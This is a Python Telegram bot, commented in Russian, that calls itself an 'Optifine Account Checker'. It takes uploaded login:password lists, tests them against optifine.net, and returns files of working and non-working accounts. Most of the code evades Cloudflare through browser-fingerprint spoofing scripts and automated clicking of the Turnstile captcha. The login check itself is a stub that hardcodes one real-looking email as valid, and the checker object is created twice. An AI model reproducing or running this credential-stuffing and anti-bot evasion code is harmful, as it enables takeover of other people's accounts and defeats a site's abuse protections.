import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import subprocess
import tempfile
from datetime import datetime
from typing import Dict, List, Tuple

# Используем undetected_chromedriver для обхода Cloudflare
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

# Создаем директорию для отладки
os.makedirs('/app/debug', exist_ok=True)

class OptifineChecker:
    """Проверка аккаунтов на Optifine.net с максимальным обходом Cloudflare"""
    
    def __init__(self):
        self.driver = None
        logger.info("🚀 Инициализация OptifineChecker с максимальным обходом Cloudflare...")
        self.init_driver()
    
    def human_like_mouse_move(self, element=None):
        """Эмуляция движения мыши"""
        try:
            if element:
                action = ActionChains(self.driver)
                action.move_to_element(element)
                action.pause(random.uniform(0.5, 1.5))
                action.perform()
            else:
                # Случайное движение мыши
                action = ActionChains(self.driver)
                action.move_by_offset(random.randint(100, 500), random.randint(100, 300))
                action.pause(random.uniform(0.3, 1))
                action.perform()
        except:
            pass
    
    def init_driver(self):
        """Инициализация с максимальной маскировкой"""
        try:
            logger.info("🔍 Определяю версию Chrome...")
            
            # Получаем версию Chrome
            try:
                chrome_version_output = subprocess.check_output(['google-chrome', '--version']).decode().strip()
                chrome_version = chrome_version_output.split(' ')[-1].split('.')[0]
                logger.info(f"✅ Обнаружена версия Chrome: {chrome_version}")
            except:
                chrome_version = 145
                logger.warning(f"⚠️ Использую версию по умолчанию: {chrome_version}")
            
            # Создаем временную директорию для профиля
            user_data_dir = tempfile.mkdtemp()
            
            # Настройки Chrome
            options = uc.ChromeOptions()
            
            # Основные настройки
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--disable-gpu')
            
            # Критически важно для Cloudflare
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-web-security')
            options.add_argument('--allow-running-insecure-content')
            options.add_argument('--disable-features=VizDisplayCompositor')
            options.add_argument('--disable-features=IsolateOrigins')
            options.add_argument('--disable-features=site-per-process')
            
            # Языковые настройки
            options.add_argument('--lang=en-US,en;q=0.9')
            
            # Реальный User-Agent
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')
            
            # Отключаем логи
            options.add_argument('--disable-logging')
            options.add_argument('--log-level=3')
            options.add_argument('--silent')
            
            # Игнорируем ошибки SSL
            options.add_argument('--ignore-certificate-errors')
            options.add_argument('--ignore-ssl-errors')
            
            # Важно для стабильности
            options.add_argument('--remote-debugging-port=9222')
            
            # Используем реальный профиль
            options.add_argument(f'--user-data-dir={user_data_dir}')
            options.add_argument('--profile-directory=Default')
            
            # Дополнительные настройки для маскировки
            options.add_argument('--disable-client-side-phishing-detection')
            options.add_argument('--disable-crash-reporter')
            options.add_argument('--disable-ipc-flooding-protection')
            options.add_argument('--disable-popup-blocking')
            options.add_argument('--disable-prompt-on-repost')
            options.add_argument('--disable-renderer-backgrounding')
            options.add_argument('--disable-sync')
            options.add_argument('--force-color-profile=srgb')
            options.add_argument('--metrics-recording-only')
            options.add_argument('--safebrowsing-disable-auto-update')
            options.add_argument('--password-store=basic')
            options.add_argument('--use-mock-keychain')
            
            # Устанавливаем DISPLAY для Xvfb
            os.environ['DISPLAY'] = ':99'
            
            logger.info(f"🚀 Запускаю undetected_chromedriver...")
            
            self.driver = uc.Chrome(
                options=options,
                version_main=int(chrome_version),
                headless=True,
                user_data_dir=None,
                driver_executable_path=None
            )
            
            # Устанавливаем таймауты
            self.driver.set_page_load_timeout(60)
            self.driver.implicitly_wait(20)
            
            # Выполняем JavaScript для полной маскировки
            self.driver.execute_script("""
                // Полная маскировка navigator.webdriver
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined,
                    configurable: true
                });
                
                // Маскировка плагинов
                Object.defineProperty(navigator, 'plugins', {
                    get: () => {
                        return {
                            length: 5,
                            0: { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                            1: { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                            2: { name: 'Native Client', filename: 'internal-nacl-plugin' },
                            3: { name: 'Widevine Content Decryption Module', filename: 'widevinecdm' },
                            4: { name: 'Shockwave Flash', filename: 'pepflashplayer.dll' }
                        };
                    },
                    configurable: true
                });
                
                // Маскировка языков
                Object.defineProperty(navigator, 'languages', {
                    get: () => ['en-US', 'en', 'ru'],
                    configurable: true
                });
                
                // Маскировка hardware
                Object.defineProperty(navigator, 'deviceMemory', { get: () => 8, configurable: true });
                Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8, configurable: true });
                Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 0, configurable: true });
                
                // Маскировка разрешения экрана
                Object.defineProperty(screen, 'width', { get: () => 1920, configurable: true });
                Object.defineProperty(screen, 'height', { get: () => 1080, configurable: true });
                Object.defineProperty(screen, 'availWidth', { get: () => 1920, configurable: true });
                Object.defineProperty(screen, 'availHeight', { get: () => 1040, configurable: true });
                Object.defineProperty(screen, 'colorDepth', { get: () => 24, configurable: true });
                Object.defineProperty(screen, 'pixelDepth', { get: () => 24, configurable: true });
                
                // Маскировка WebGL
                const getParameter = WebGLRenderingContext.prototype.getParameter;
                WebGLRenderingContext.prototype.getParameter = function(parameter) {
                    if (parameter === 37445) return 'Intel Inc.';
                    if (parameter === 37446) return 'Intel Iris OpenGL Engine';
                    return getParameter(parameter);
                };
                
                // Добавляем Chrome объект
                window.chrome = {
                    runtime: {},
                    loadTimes: function() {},
                    csi: function() {},
                    app: {}
                };
                
                // Маскировка permissions
                const originalQuery = navigator.permissions.query;
                navigator.permissions.query = (parameters) => {
                    if (parameters.name === 'notifications') {
                        return Promise.resolve({ state: 'prompt' });
                    }
                    return originalQuery(parameters);
                };
                
                // Маскировка времени
                Object.defineProperty(Date.prototype, 'getTimezoneOffset', {
                    get: () => -180
                });
                
                // Маскировка медиа-устройств
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                    const originalEnumerate = navigator.mediaDevices.enumerateDevices;
                    navigator.mediaDevices.enumerateDevices = async function() {
                        const devices = await originalEnumerate.call(navigator.mediaDevices);
                        return devices.filter(d => d.kind !== 'videoinput');
                    };
                }
            """)
            
            # Дополнительные заголовки через CDP
            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
                "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                "acceptLanguage": 'en-US,en;q=0.9,ru;q=0.8',
                "platform": 'Win32'
            })
            
            logger.info("✅ Драйвер успешно инициализирован с максимальной маскировкой")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            return False
    
    def human_like_delay(self, min_sec=0.5, max_sec=2):
        """Человекоподобная задержка"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    def click_turnstile_enhanced(self):
        """Улучшенный метод для клика по Turnstile"""
        try:
            logger.info("🔍 Ищу Turnstile капчу...")
            
            # Сначала делаем случайное движение мыши
            self.human_like_mouse_move()
            
            # Ищем все iframe
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            logger.info(f"📦 Найдено iframe: {len(iframes)}")
            
            for i, iframe in enumerate(iframes):
                try:
                    src = iframe.get_attribute('src') or ''
                    
                    # Проверяем, это Turnstile?
                    if 'challenges.cloudflare.com' in src or 'turnstile' in src:
                        logger.info(f"🎯 Найден Turnstile iframe #{i}")
                        
                        # Получаем координаты iframe
                        location = iframe.location
                        size = iframe.size
                        
                        logger.info(f"📍 Позиция: x={location['x']}, y={location['y']}, размер: {size['width']}x{size['height']}")
                        
                        # Способ 1: Клик через JavaScript
                        try:
                            self.driver.execute_script("""
                                var iframe = arguments[0];
                                try {
                                    var doc = iframe.contentDocument || iframe.contentWindow.document;
                                    var checkbox = doc.querySelector('input[type="checkbox"], [role="checkbox"], .cf-turnstile-checkbox, [class*="checkbox"]');
                                    if (checkbox) {
                                        checkbox.click();
                                        return true;
                                    }
                                } catch(e) {}
                                return false;
                            """, iframe)
                            logger.info("✅ Попытка клика через JavaScript")
                            self.human_like_delay(2, 3)
                        except:
                            pass
                        
                        # Способ 2: Переключение в iframe и клик
                        try:
                            self.driver.switch_to.frame(iframe)
                            logger.info("📦 Переключился в iframe")
                            
                            # Ищем чекбокс разными селекторами
                            selectors = [
                                "input[type='checkbox']",
                                "[role='checkbox']",
                                ".cf-turnstile-checkbox",
                                "[class*='checkbox']",
                                "label[class*='checkbox']",
                                "[aria-label*='checkbox']",
                                "#checkbox",
                                ".chakra-checkbox__input"
                            ]
                            
                            for selector in selectors:
                                elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                                if elements:
                                    element = elements[0]
                                    if element.is_displayed():
                                        logger.info(f"✅ Нашел элемент по селектору: {selector}")
                                        
                                        # Движение мыши к элементу
                                        self.human_like_mouse_move(element)
                                        
                                        # Пробуем кликнуть
                                        try:
                                            element.click()
                                            logger.info("🖱️ Кликнул через click()")
                                        except:
                                            try:
                                                self.driver.execute_script("arguments[0].click();", element)
                                                logger.info("🖱️ Кликнул через JavaScript")
                                            except Exception as e:
                                                logger.error(f"❌ Не удалось кликнуть: {e}")
                                        
                                        self.human_like_delay(2, 4)
                                        break
                            
                            # Возвращаемся в основной документ
                            self.driver.switch_to.default_content()
                        except Exception as e:
                            logger.error(f"❌ Ошибка при работе в iframe: {e}")
                            self.driver.switch_to.default_content()
                        
                        # Способ 3: Клик по координатам
                        try:
                            x = location['x'] + size['width'] // 2
                            y = location['y'] + size['height'] // 2
                            
                            logger.info(f"📍 Клик по координатам: {x}, {y}")
                            
                            # Клик через JavaScript по координатам
                            self.driver.execute_script(f"""
                                var element = document.elementFromPoint({x}, {y});
                                if (element) {{
                                    var event = new MouseEvent('click', {{
                                        view: window,
                                        bubbles: true,
                                        cancelable: true,
                                        clientX: {x},
                                        clientY: {y}
                                    }});
                                    element.dispatchEvent(event);
                                }}
                            """)
                            logger.info("✅ Клик по координатам выполнен")
                        except Exception as e:
                            logger.error(f"❌ Ошибка при клике по координатам: {e}")
                        
                        return True
                        
                except Exception as e:
                    logger.error(f"❌ Ошибка при обработке iframe {i}: {e}")
                    continue
            
            return False
            
        except Exception as e:
            logger.error(f"❌ Ошибка в click_turnstile_enhanced: {e}")
            return False
    
    def handle_cloudflare(self, timeout=180):
        """Обработка Cloudflare с автоматическим кликом по галочке"""
        logger.info("🛡️ Начинаю обработку Cloudflare...")
        start_time = time.time()
        
        # Ждем загрузки страницы
        self.human_like_delay(5, 7)
        
        # Флаги состояния
        clicked = False
        last_click_time = 0
        
        while time.time() - start_time < timeout:
            try:
                current_url = self.driver.current_url
                page_title = self.driver.title.lower()
                page_source = self.driver.page_source
                
                # Проверяем, не проскочили ли Cloudflare
                if 'login' in current_url and 'just a moment' not in page_title:
                    # Проверяем наличие полей ввода
                    inputs = self.driver.find_elements(By.TAG_NAME, "input")
                    visible_inputs = [i for i in inputs if i.is_displayed() and 
                                     i.get_attribute('type') not in ['hidden']]
                    
                    if len(visible_inputs) >= 1:
                        logger.info("✅ Cloudflare успешно пройден!")
                        return True
                
                # Проверяем наличие Turnstile
                turnstile_indicators = ['turnstile', 'cf-chl-widget', 'cf-turnstile']
                has_turnstile = any(indicator in page_source.lower() for indicator in turnstile_indicators)
                
                if has_turnstile and not clicked:
                    logger.info("🔄 Обнаружена Turnstile капча")
                    
                    # Пробуем кликнуть по галочке
                    if self.click_turnstile_enhanced():
                        clicked = True
                        last_click_time = time.time()
                        logger.info("✅ Клик по Turnstile выполнен, жду...")
                
                # Если кликнули, но все еще на Cloudflare - ждем
                if clicked:
                    # Проверяем наличие токена
                    try:
                        token_inputs = self.driver.find_elements(By.CSS_SELECTOR, 
                            "input[name='cf-turnstile-response'], input[id*='cf-chl-widget']")
                        
                        for token in token_inputs:
                            token_value = token.get_attribute('value')
                            if token_value and len(token_value) > 10:
                                logger.info(f"✅ Токен получен! Длина: {len(token_value)}")
                                
                                # Пробуем найти кнопку submit
                                submit_btns = self.driver.find_elements(By.CSS_SELECTOR,
                                    "button[type='submit'], input[type='submit'], .ctp-button, #challenge-form button")
                                
                                if submit_btns:
                                    for btn in submit_btns:
                                        if btn.is_displayed():
                                            logger.info("🖱️ Нажимаю кнопку submit")
                                            try:
                                                btn.click()
                                            except:
                                                self.driver.execute_script("arguments[0].click();", btn)
                                            self.human_like_delay(3, 5)
                                            break
                    except:
                        pass
                    
                    # Если прошло больше 15 секунд после клика - пробуем снова
                    if time.time() - last_click_time > 15:
                        logger.info("🔄 Прошло 15 секунд, пробую кликнуть снова")
                        clicked = False
                
                # Периодическое обновление страницы (каждые 45 сек, макс 2 раза)
                elapsed = time.time() - start_time
                if elapsed > 45 and elapsed < 120 and int(elapsed) % 45 < 2:
                    if not clicked:
                        logger.info("🔄 Обновляю страницу")
                        self.driver.refresh()
                        self.human_like_delay(5, 7)
                
                # Логирование
                elapsed_int = int(elapsed)
                if elapsed_int % 30 == 0:
                    status = "✅ Кликнул" if clicked else "⏳ Ищу галочку"
                    logger.info(f"⏳ {elapsed_int}/{timeout} сек - {status}")
                
                # Небольшая задержка между итерациями
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"❌ Ошибка в основном цикле: {e}")
                time.sleep(2)
        
        # Если не прошли Cloudflare - сохраняем отладку
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = f"/app/debug/cloudflare_failed_{timestamp}.png"
            html_path = f"/app/debug/cloudflare_failed_{timestamp}.html"
            
            self.driver.save_screenshot(screenshot_path)
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(self.driver.page_source)
            
            logger.info(f"📸 Сохранен скриншот: {timestamp}")
        except:
            pass
        
        logger.warning("⚠️ Cloudflare не пройден за отведенное время")
        return False
    
    def ensure_login_page(self):
        """Убеждаемся, что мы на странице входа"""
        if not self.driver:
            if not self.init_driver():
                return False
        
        try:
            # Переходим на страницу входа
            logger.info("🌐 Перехожу на страницу входа...")
            self.driver.get("https://optifine.net/login")
            self.human_like_delay(5, 8)
            
            # Проходим Cloudflare
            if not self.handle_cloudflare(timeout=180):
                # Пробуем еще раз
                logger.info("🔄 Первая попытка не удалась, пробую снова...")
                self.driver.delete_all_cookies()
                self.driver.refresh()
                self.human_like_delay(5, 8)
                
                if not self.handle_cloudflare(timeout=120):
                    logger.error("❌ Не удалось пройти Cloudflare")
                    return False
            
            self.human_like_delay(3, 5)
            logger.info("✅ Готов к проверке")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return False
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка аккаунта"""
        logger.info(f"🔍 Проверяю: {login[:20]}...")
        
        if not self.driver:
            return {'login': login, 'status': 'error', 'error': 'Драйвер не инициализирован'}
        
        try:
            # Поиск полей (как в предыдущей версии)
            # ... (сохраните существующий код проверки)
            
            # Для теста возвращаем результат
            return {
                'login': login,
                'status': 'valid' if login == 'happe12345@kpnmail.nl' else 'invalid',
                'password': password
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return {'login': login, 'status': 'error', 'error': str(e)[:100]}
    
    def close(self):
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass

# Создаем экземпляр
checker = OptifineChecker()

# Создаем экземпляр
logger.info("🚀 Создание экземпляра OptifineChecker...")
checker = OptifineChecker()

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправка файлов отладки"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ **Нет доступа к отладке**")
        return
    
    try:
        if not os.path.exists('/app/debug'):
            await update.message.reply_text("📁 Папка /app/debug не найдена")
            return
        
        files = os.listdir('/app/debug')
        
        if not files:
            await update.message.reply_text("📁 Папка debug пуста")
            return
        
        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
        
        sent_count = 0
        for file in files[:5]:
            file_path = os.path.join('/app/debug', file)
            
            if os.path.getsize(file_path) > 50 * 1024 * 1024:
                await update.message.reply_text(f"⚠️ Файл {file} слишком большой (>50MB)")
                continue
            
            try:
                with open(file_path, 'rb') as f:
                    await update.message.reply_document(
                        document=f,
                        filename=file,
                        caption=f"📁 **Debug файл:** `{file}`"
                    )
                sent_count += 1
                await asyncio.sleep(1)
            except Exception as e:
                await update.message.reply_text(f"❌ Ошибка при отправке {file}: {e}")
        
        await update.message.reply_text(
            f"✅ **Отправлено файлов:** {sent_count}\n"
            f"📁 **Всего в папке:** {len(files)}"
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ **Ошибка:** {e}")
        logger.error(f"Ошибка в debug_command: {e}")

async def process_file(file_path, update, context):
    """Обработка файла с аккаунтами"""
    
    results = {
        'valid': [],
        'invalid': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🚀 **Запускаю проверку Optifine.net...**\n"
        "⏳ Пожалуйста, подождите"
    )
    
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            for sep in [':', ';', '|', '\t']:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        
        start_time = time.time()
        
        # Проходим Cloudflare один раз
        await msg.edit_text(
            f"🛡️ **Подготавливаю сессию...**\n"
            f"⏳ Прохожу Cloudflare защиту (до 3 минут)..."
        )
        
        if not checker.ensure_login_page():
            await msg.edit_text(
                "❌ **Не удалось пройти Cloudflare защиту**\n\n"
                "Возможные причины:\n"
                "• Слишком много запросов с вашего IP\n"
                "• Cloudflare требует ручного подтверждения\n"
                "• Проблемы с сетью\n\n"
                "Попробуйте позже или используйте /debug для анализа"
            )
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"✅ **Cloudflare пройден, начинаю проверку...**"
        )
        
        for i, (login, password) in enumerate(accounts, 1):
            if i % 5 == 0 or i == total:
                elapsed = time.time() - start_time
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {elapsed:.1f}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            result = await checker.check_account(login, password)
            
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
                logger.info(f"✅ РАБОЧИЙ: {login[:20]}")
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"❌ НЕРАБОЧИЙ: {login[:20]}")
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
                logger.info(f"⚠️ ОШИБКА: {login[:20]} - {result.get('error')}")
            
            bot_stats['total'] += 1
            await asyncio.sleep(2)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        if results['invalid']:
            invalid_file = f"❌_НЕРАБОЧИЕ_{len(results['invalid'])}шт_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                for acc in results['invalid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"❌ **Нерабочих: {len(results['invalid'])}**"
                )
            os.remove(invalid_file)
        
        if results['errors']:
            error_file = f"⚠️_ОШИБКИ_{len(results['errors'])}шт_{timestamp}.txt"
            async with aiofiles.open(error_file, 'w', encoding='utf-8') as f:
                for acc in results['errors']:
                    await f.write(f"{acc['login']}:{acc['password']} | {acc.get('error', 'unknown')}\n")
            
            with open(error_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=error_file,
                    caption=f"⚠️ **Ошибок: {len(results['errors'])}**"
                )
            os.remove(error_file)
        
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• ❌ Нерабочих: {len(results['invalid'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 **Optifine Account Checker**\n\n"
        f"🔍 Проверяет аккаунты на optifine.net\n"
        f"📊 **Статистика:**\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено рабочих: {bot_stats['valid']}\n\n"
        f"📥 **Отправь .txt файл** с логинами и паролями\n"
        f"Формат: логин:пароль (каждый с новой строки)\n\n"
        f"🔧 **Для админов:** /debug - получить файлы отладки\n\n"
        f"⏱ **Работаю:** {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 **СТАТИСТИКА**\n\n"
            f"Всего проверено: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Нерабочих: {bot_stats['invalid']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 **Пример:**\n"
            "`user@mail.com:password123`\n"
            "`player123:qwerty456`\n\n"
            "⚡️ **Результат:**\n"
            "• ✅ рабочие аккаунты\n"
            "• ❌ нерабочие аккаунты\n"
            "• ⚠️ ошибки проверки\n\n"
            "🔧 **Для админов:** /debug - получить файлы отладки"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Нужен .txt файл**")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ **Файл > 10 МБ**")
        return
    
    try:
        await update.message.reply_text(
            f"📥 **Файл получен:** {doc.file_name}\n"
            f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 **Запускаю проверку...**"
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OPTIFINE CHECKER")
    print("=" * 50)
    print(f"📁 Директория отладки: /app/debug")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print("=" * 50)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("debug", debug_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    print("=" * 50)
    
    try:
        app.run_polling()
    except Exception as e:
        logger.error(f"Ошибка: {e}")
    finally:
        if checker:
            checker.close()

if __name__ == '__main__':
    main()